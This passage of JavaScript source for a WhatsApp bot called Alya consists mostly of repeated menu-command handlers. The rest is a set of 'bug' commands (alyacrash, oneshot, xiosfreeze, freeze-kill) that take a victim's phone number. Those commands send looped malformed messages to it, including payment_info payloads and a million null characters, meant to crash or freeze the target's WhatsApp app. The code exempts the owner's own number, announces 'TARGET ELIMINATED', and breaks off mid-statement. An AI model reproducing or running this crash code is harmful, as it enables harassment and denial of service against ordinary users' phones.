                    body: proto.Message.InteractiveMessage.Body.create({
                        text: alyamenu
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: botname
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        ...(await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg') }, { upload: AlyaBotInc.waUploadToServer })),
                        title: '',
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{"display_text":"Channel 💬","url":"https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09","merchant_url":"https://www.google.com"}`
                            }
                        ]
                    })
                })
            }
        }
    }, { quoted: m });

    await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break;

case 'randomvideomenu': {
    let alyamenu = `Hi ${pushname}\n\n${randomvideomenu(prefix, hituet)}`;
    
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: alyamenu
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: botname
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        ...(await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg') }, { upload: AlyaBotInc.waUploadToServer })),
                        title: '',
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{"display_text":"Channel 💬","url":"https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09","merchant_url":"https://www.google.com"}`
                            }
                        ]
                    })
                })
            }
        }
    }, { quoted: m });

    await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break;

case 'nsfwmenu': {
    let alyamenu = `Hi ${pushname}\n\n${nsfwmenu(prefix, hituet)}`;
    
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: alyamenu
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: botname
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        ...(await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg') }, { upload: AlyaBotInc.waUploadToServer })),
                        title: '',
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{"display_text":"Channel 💬","url":"https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09","merchant_url":"https://www.google.com"}`
                            }
                        ]
                    })
                })
            }
        }
    }, { quoted: m });

    await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break;

case 'animemenu': {
    let alyamenu = `Hi ${pushname}\n\n${animemenu(prefix, hituet)}`;
    
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: alyamenu
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: botname
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        ...(await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg') }, { upload: AlyaBotInc.waUploadToServer })),
                        title: '',
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{"display_text":"Channel 💬","url":"https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09","merchant_url":"https://www.google.com"}`
                            }
                        ]
                    })
                })
            }
        }
    }, { quoted: m });

    await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break;

case 'stickermenu': {
    let alyamenu = `Hi ${pushname}\n\n${stickermenu(prefix, hituet)}`;
    
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: alyamenu
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: botname
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        ...(await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg') }, { upload: AlyaBotInc.waUploadToServer })),
                        title: '',
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{"display_text":"Channel 💬","url":"https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09","merchant_url":"https://www.google.com"}`
                            }
                        ]
                    })
                })
            }
        }
    }, { quoted: m });

    await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break;
case 'databasemenu': {
    let alyamenu = `Hi ${pushname}\n\n${databasemenu(prefix, hituet)}`;
    
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: alyamenu
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: botname
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        ...(await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg') }, { upload: AlyaBotInc.waUploadToServer })),
                        title: '',
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{"display_text":"Channel 💬","url":"https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09","merchant_url":"https://www.google.com"}`
                            }
                        ]
                    })
                })
            }
        }
    }, { quoted: m });

    await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break;
case 'searchmenu': {
    let alyamenu = `Hi ${pushname}\n\n${searchmenu(prefix, hituet)}`;
    
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: alyamenu
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: botname
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        ...(await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg') }, { upload: AlyaBotInc.waUploadToServer })),
                        title: '',
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{"display_text":"Channel 💬","url":"https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09","merchant_url":"https://www.google.com"}`
                            }
                        ]
                    })
                })
            }
        }
    }, { quoted: m });

    await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break;
case 'storemenu': {
    let alyamenu = `Hi ${pushname}\n\n${storemenu(prefix, hituet)}`;
    
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: alyamenu
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: botname
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        ...(await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg') }, { upload: AlyaBotInc.waUploadToServer })),
                        title: '',
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{"display_text":"Channel 💬","url":"https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09","merchant_url":"https://www.google.com"}`
                            }
                        ]
                    })
                })
            }
        }
    }, { quoted: m });

    await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break;
case 'aimenu': {
    let alyamenu = `Hi ${pushname}\n\n${aimenu(prefix, hituet)}`;
    
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: alyamenu
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: botname
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        ...(await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg') }, { upload: AlyaBotInc.waUploadToServer })),
                        title: '',
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{"display_text":"Channel 💬","url":"https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09","merchant_url":"https://www.google.com"}`
                            }
                        ]
                    })
                })
            }
        }
    }, { quoted: m });

    await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break;
case 'religionmenu': {
    let alyamenu = `Hi ${pushname}\n\n${religionmenu(prefix, hituet)}`;
    
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: alyamenu
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: botname
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        ...(await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg') }, { upload: AlyaBotInc.waUploadToServer })),
                        title: '',
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{"display_text":"Channel 💬","url":"https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09","merchant_url":"https://www.google.com"}`
                            }
                        ]
                    })
                })
            }
        }
    }, { quoted: m });

    await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break;
case 'listmenu': {
    let alyamenu = `Hi ${pushname}\n\n${listmenu(prefix, hituet)}`;
    
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: alyamenu
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: botname
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        ...(await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg') }, { upload: AlyaBotInc.waUploadToServer })),
                        title: '',
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{"display_text":"Channel 💬","url":"https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09","merchant_url":"https://www.google.com"}`
                            }
                        ]
                    })
                })
            }
        }
    }, { quoted: m });

    await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break;
case 'convertmenu': {
    let alyamenu = `Hi ${pushname}\n\n${convertmenu(prefix, hituet)}`;
    
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: alyamenu
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: botname
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        ...(await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg') }, { upload: AlyaBotInc.waUploadToServer })),
                        title: '',
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{"display_text":"Channel 💬","url":"https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09","merchant_url":"https://www.google.com"}`
                            }
                        ]
                    })
                })
            }
        }
    }, { quoted: m });

    await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break;
case 'bugmenu': {
    let alyamenu = `Hi ${pushname}\n\n${bugmenu(prefix, hituet)}`;
    
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: alyamenu
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: botname
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        ...(await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg') }, { upload: AlyaBotInc.waUploadToServer })),
                        title: '',
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{"display_text":"Channel 💬","url":"https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09","merchant_url":"https://www.google.com"}`
                            }
                        ]
                    })
                })
            }
        }
    }, { quoted: m });

    await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break;
            case 'checkaccount':
            case 'account': {
               let a = db.data.users[sender]
               let b = `Below is your account information\n`
               b += `================================\n`
               b += `Serial Code:\n*[${a.serialNumber}]*\n`
               b += `Title: ${a.title}\n`
               b += `Afk Time: ${a.afkTime}\n`
               b += `Afk Reason: ${a.afkReason}\n` 
               b += `Nickname: ${a.nick}\n`
               b += `Premium Status: ${a.premium}\n`
               b += `Your Limit: ${a.limit}\n`
               b += `================================`
               AlyaBotInc.sendMessage(sender, { text: b }, { quoted: m })
               replygcalya('Account Details Has Been Sent In Private Chat')
            }
            break
            case 'limit':
            case 'checklimit': {
               let a = db.data.users[sender]
               let b = `Your Limit ${a.limit}\n` 
               b += `Premium Status ${isPremium ? 'On' : 'Off' }\n` 
               b += `Serial Code:\n*[${a.serialNumber}]*\n`
               replygcalya(b)
            }
            break
            
            //bug && war cases 
//⚠️do not edit cases otherwise bug not work
//bug cases 
case 'clearchat':
m.reply('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
break
//================{Bug Cases}===========\\
case "alyacrash": {
    if (!isPremium) return replygcalya(mess.prem);
    if (!text) 
        return replygcalya(
        `Use ${prefix + command} Victim number\nExample ${prefix + command} 23481xxxxxxxx`
    );

    let number = text.split(",")[0];
    let cleanedNumber = number.replace(/[^0-9]/g, "");
    let whatsappNumber = cleanedNumber + "@s.whatsapp.net";

    var contactInfo = await AlyaBotInc.onWhatsApp(whatsappNumber);

    if (cleanedNumber == "2349123721026") {
        return;
    }

    if (contactInfo.length == 0) {
        return replygcalya("The number is not registered on WhatsApp");
    }

    replygcalya("please wait, " + command + " hack is in process..");
    
    // Define function to add random delay between actions
    const randomDelay = (min, max) => {
        return new Promise(resolve => setTimeout(resolve, Math.floor(Math.random() * (max - min + 1) + min)));
    };

    for (let j = 0; j < 5; j++) { // Loop 5 times
        await bakdok(whatsappNumber, Alyabug);
         // Random delay between 2 
        await sendPaymentInfoMessage(whatsappNumber, Alyabug);
        await penghitaman(whatsappNumber, painbug);
        await iponcrash(whatsappNumber, force2);
        await iponcrash(whatsappNumber, force);
        await sendSystemCrashMessage(whatsappNumber, force);
   sendSystemCrashMessage(whatsappNumber, force2);
        await sendPaymentInfoMessage(whatsappNumber, painbug);
        await ngeloc(whatsappNumber, force2);
        await ngeloc(whatsappNumber, painbug);

         if (j === 1) {
            // Additional logic if needed
        }
    }
  replygcalya(
        "TARGET ELIMINATED ☠️ @" +
        whatsappNumber.split("@")[0] +
        " Using " +
        command +
        "👑ALYA IS SUPREME 👑",
        [whatsappNumber]
    );
}
break;

                case "oneshot":
                    {
                        if (!AlyaTheQueen) return replygcalya(mess.owner);
                        if (!text)
                            return replygcalya(`Usage .${command} 2349123721026`);
                        let cleanedNumber = text.replace(/[^0-9]/g, "");
                        if (cleanedNumber.startsWith("0"))
                            return replygcalya(
                            `Example : ${prefix + command} 2349123721026`
                        );
                        var contactInfo = await AlyaBotInc.onWhatsApp(
                            cleanedNumber + "@s.whatsapp.net"
                        );
                        let whatsappNumber = cleanedNumber + "@s.whatsapp.net";
                        if (cleanedNumber == "2349123721026") {
                            return;
                        }
                        if (cleanedNumber == "2349123721026") {
                            return;
                        }
                        if (cleanedNumber == "2349123721026") {
                            return;
                        }
                        if (contactInfo.length == 0) {
                            return replygcalya(
                                "The number is not registered on WhatsApp"
                            );
                        }
                        async function alyareignsShot(jid) {
                            for (let i = `3`; i !== 0; i -= 1) {
                                const crasoh = await AlyaBotInc.relayMessage(
                                    jid,
                                    {
                                        extendedTextMessage: {
                                            text: "👑ALYA IS SUPREME 👑",
                                            matchedText:
                                            "I REIGN SUPREME AMONG ALL",
                                            canonicalUrl: "https://example.com",
                                            description:
                                            "👑ALYA IS SUPREME 👑👑ALYA IS SUPREME 👑👑ALYA IS SUPREME 👑",
                                            title: "👑ALYA IS SUPREME 👑",
                                            textArgb: 0xff000000,
                                            backgroundArgb: 0xffffffff,
                                            font: 1,
                                            previewType: 0,
                                            jpegThumbnail: await getBuffer(
                                                "https://example.com/thumb.jpg"
                                            ),
                                            contextInfo: {},
                                            doNotPlayInline: false,
                                            thumbnailDirectPath:
                                            "https://example.com/thumb.jpg",
                                            thumbnailSha256: Buffer.from(
                                                "1234567890abcdef",
                                                "hex"
                                            ),
                                            thumbnailEncSha256: Buffer.from(
                                                "abcdef1234567890",
                                                "hex"
                                            ),
                                            mediaKey: Buffer.from(
                                                "abcdef1234567890abcdef1234567890",
                                                "hex"
                                            ),
                                            mediaKeyTimestamp: Date.now(),
                                            thumbnailHeight: 200,
                                            thumbnailWidth: 200,
                                            inviteLinkGroupType: 0, // InviteLinkGroupType.DEFAULT
                                            inviteLinkParentGroupSubjectV2:
                                            "Parent Group Subject",
                                            inviteLinkParentGroupThumbnailV2:
                                            Buffer.from(
                                                "abcdef1234567890",
                                                "hex"
                                            ),
                                            inviteLinkGroupTypeV2: 0,
                                            viewOnce: true
                                        }
                                    },
                                    {
                                        participant: {
                                            jid: jid
                                        }
                                    }
                                );
                            }
                            for (let i = `3`; i !== 0; i -= 1) {
                                await AlyaBotInc.relayMessage(
                                    jid,
                                    {
                                        viewOnceMessage: {
                                            message: {
                                                messageContextInfo: {
                                                    deviceListMetadataVersion: 2,
                                                    deviceListMetadata: {}
                                                },
                                                interactiveMessage: {
                                                    nativeFlowMessage: {
                                                        buttons: [{
                                                            name: "payment_info",
                                                            buttonParamsJson:
                                                            '{"currency":"BRL","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"👑드림 가이 KING","key":"+234912xxxxxx3","key_type":"X"}}]}'
                                                        }]
                                                    }
                                                }
                                            }
                                        }
                                    },
                                    {
                                        participant: {
                                            jid: jid
                                        }
                                    },
                                    {
                                        messageId: null
                                    }
                                );
                            }
                            for (let i = `3`; i !== 0; i -= 1) {
                                await AlyaBotInc.relayMessage(
                                    jid,
                                    {
                                        viewOnceMessage: {
                                            message: {
                                                interactiveMessage: {
                                                    header: {
                                                        title: "",
                                                        subtitle: " "
                                                    },
                                                    body: {
                                                        text: "👑ALYA IS SUPREME 👑"
                                                    },
                                                    footer: {
                                                        text: "xp"
                                                    },
                                                    nativeFlowMessage: {
                                                        buttons: [{
                                                            name: "cta_url",
                                                            buttonParamsJson:
                                                            "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : '', merchant_url : '' }"
                                                        }],
                                                        messageParamsJson:
                                                        "\0".repeat(1000000)
                                                    }
                                                }
                                            }
                                        }
                                    },
                                    {
                                        participant: {
                                            jid: jid
                                        }
                                    }
                                );
                            }
                        }
                        await replygcalya(`In process....`);
                        await alyareignsShot(whatsappNumber);
                        sendMessageWithMentions(
                            "Successfully Sent Bug To @" +
                            whatsappNumber.split("@")[0] +
                            " Using *" +
                            command +
                            "👑ALYA IS SUPREME 👑",
                            [whatsappNumber]
                        );
                    }
                    
break;

case "xiosfreeze": {
if (!AlyaTheQueen) return replygcalya(mess.owner);
if (!text)
return replygcalya(`Usage .${command} 2349123721026`);
let cleanedNumber = text.replace(/[^0-9]/g, "");
if (cleanedNumber.startsWith("0"))
return replygcalya(
`Example : ${prefix + command} 2349123721026`
);
var contactInfo = await AlyaBotInc.onWhatsApp(
cleanedNumber + "@s.whatsapp.net"
);
let whatsappNumber = cleanedNumber + "@s.whatsapp.net";
if (cleanedNumber == "2349123721026") {
return;
}
if (cleanedNumber == "2349123721026") {
return;
}
if (cleanedNumber == "2349123721026") {
return;
}
if (contactInfo.length == 0) {
return replygcalya(
"The number is not registered on WhatsApp"
);
}
async function alyareignsShot(jid) {
for (let i = `3`; i !== 0; i -= 1) {
const crasoh = await AlyaBotInc.relayMessage(
jid,
{
extendedTextMessage: {
text: "👑KING 👑👑ALYA",
matchedText:
"I REIGN SUPREME AMONG ALL",
canonicalUrl: "https://example.com",
description:
"👑KING 👑👑ALYA👑KING 👑👑ALYA👑KING 👑👑ALYA👑KING 👑👑ALYA",
title: "👑KING 👑👑ALYA",
textArgb: 0xff000000,
backgroundArgb: 0xffffffff,
font: 1,
previewType: 0,
jpegThumbnail: await getBuffer(
"https://example.com/thumb.jpg"
),
contextInfo: {},
doNotPlayInline: false,
thumbnailDirectPath:
"https://example.com/thumb.jpg",
thumbnailSha256: Buffer.from(
"1234567890abcdef",
"hex"
),
thumbnailEncSha256: Buffer.from(
"abcdef1234567890",
"hex"
),
mediaKey: Buffer.from(
"abcdef1234567890abcdef1234567890",
"hex"
),
mediaKeyTimestamp: Date.now(),
thumbnailHeight: 200,
thumbnailWidth: 200,
inviteLinkGroupType: 0, // InviteLinkGroupType.DEFAULT
inviteLinkParentGroupSubjectV2:
"Parent Group Subject",
inviteLinkParentGroupThumbnailV2:
Buffer.from(
"abcdef1234567890",
"hex"
),
inviteLinkGroupTypeV2: 0,
viewOnce: true
}
},
{
participant: {
jid: jid
}
}
);
}
for (let i = `3`; i !== 0; i -= 1) {
await AlyaBotInc.relayMessage(
jid,
{
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadataVersion: 2,
deviceListMetadata: {}
},
interactiveMessage: {
nativeFlowMessage: {
buttons: [{
name: "payment_info",
buttonParamsJson:
'{"currency":"BRL","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"👑드림 가이 KING","key":"+234912xxxxxx3","key_type":"X"}}]}'
}]
}
}
}
}
},
{
participant: {
jid: jid
}
},
{
messageId: null
}
);
}
for (let i = `3`; i !== 0; i -= 1) {
await AlyaBotInc.relayMessage(
jid,
{
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: "",
subtitle: " "
},
body: {
text: "👑KING 👑👑ALYA👑KING 👑👑ALYA👑KING 👑👑ALYA"
},
footer: {
text: "xp"
},
nativeFlowMessage: {
buttons: [{
name: "cta_url",
buttonParamsJson:
"{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : '', merchant_url : '' }"
}],
messageParamsJson:
"\0".repeat(1000000)
}
}
}
}
},
{
participant: {
jid: jid
}
}
);
}
}
await replygcalya(`In process....`);
await alyareignsShot(whatsappNumber);
sendMessageWithMentions(
"Successfully Sent Bug To @" +
whatsappNumber.split("@")[0] +
" Using *" +
command +
"👑ALYA IS SUPREME 👑",
[whatsappNumber]
);
}
break;
case "freeze-kill": {
if (!AlyaTheQueen) return replygcalya(mess.owner);
if (!text)
return replygcalya(`Usage .${command} 2349123721026`);
let cleanedNumber = text.replace(/[^0-9]/g, "");
if (cleanedNumber.startsWith("0"))
return replygcalya(
`Example : ${prefix + command} 2349123721026`
);
var contactInfo = await AlyaBotInc.onWhatsApp(
cleanedNumber + "@s.whatsapp.net"
);
let whatsappNumber = cleanedNumber + "@s.whatsapp.net";
if (cleanedNumber == "2349123721026") {
return;
}
if (cleanedNumber == "2349123721026") {
return;
}
if (cleanedNumber == "2349123721026") {
return;
}
if (contactInfo.length == 0) {
return replygcalya(
"The number is not registered on WhatsApp"
);
}
async function alyareignsShot(jid) {
for (let i = `3`; i !== 0; i -= 1) {
const crasoh = await AlyaBotInc.relayMessage(
jid,
{
extendedTextMessage: {
text: "👑KING 👑👑ALYA",
matchedText:
"I REIGN SUPREME AMONG ALL",
canonicalUrl: "https://example.com",
description:
"👑KING 👑👑ALYA👑KING 👑👑ALYA👑KING 👑👑ALYA👑KING 👑👑ALYA",
title: "👑KING 👑👑ALYA",
textArgb: 0xff000000,
backgroundArgb: 0xffffffff,
font: 1,
previewType: 0,
jpegThumbnail: await getBuffer(
"https://example.com/thumb.jpg"
),
contextInfo: {},
doNotPlayInline: false,
thumbnailDirectPath:
"https://example.com/thumb.jpg",
thumbnailSha256: Buffer.from(
"1234567890abcdef",
"hex"
),
thumbnailEncSha256: Buffer.from(
"abcdef1234567890",
"hex"
),
mediaKey: Buffer.from(
"abcdef1234567890abcdef1234567890",
"hex"
),
mediaKeyTimestamp: Date.now(),
thumbnailHeight: 200,
thumbnailWidth: 200,
inviteLinkGroupType: 0, // InviteLinkGroupType.DEFAULT
inviteLinkParentGroupSubjectV2:
"Parent Group Subject",
inviteLinkParentGroupThumbnailV2:
Buffer.from(
"abcdef1234567890",
"hex"
),
inviteLinkGroupTypeV2: 0,
viewOnce: true
}
},
{
participant: {
jid: jid
}
}
);
}
for (let i = `3`; i !== 0; i -= 1) {
await AlyaBotInc.relayMessage(
jid,
{
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadataVersion: 2,
deviceListMetadata: {}
},
interactiveMessage: {
nativeFlowMessage: {
buttons: [{
name: "payment_info",
buttonParamsJson:
'{"currency":"BRL","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"☠️드림 가이 KING","key":"+234912xxxxxx3","key_type":"X"}}]}'
}]
}
}
}
}
},
{
participant: {
jid: jid
}
},
{
messageId: null
}
);
}
for (let i = `3`; i !== 0; i -= 1) {
await AlyaBotInc.relayMessage(
jid,
{
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: "",
subtitle: " "
},
body: {
text: "👑KING 👑👑ALYA👑KING 👑👑ALYA👑KING 👑👑ALYA"
},
footer: {
text: "xp"
},
nativeFlowMessage: {
buttons: [{
name: "cta_url",
buttonParamsJson:
"{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : '', merchant_url : '' }"
}],
messageParamsJson:
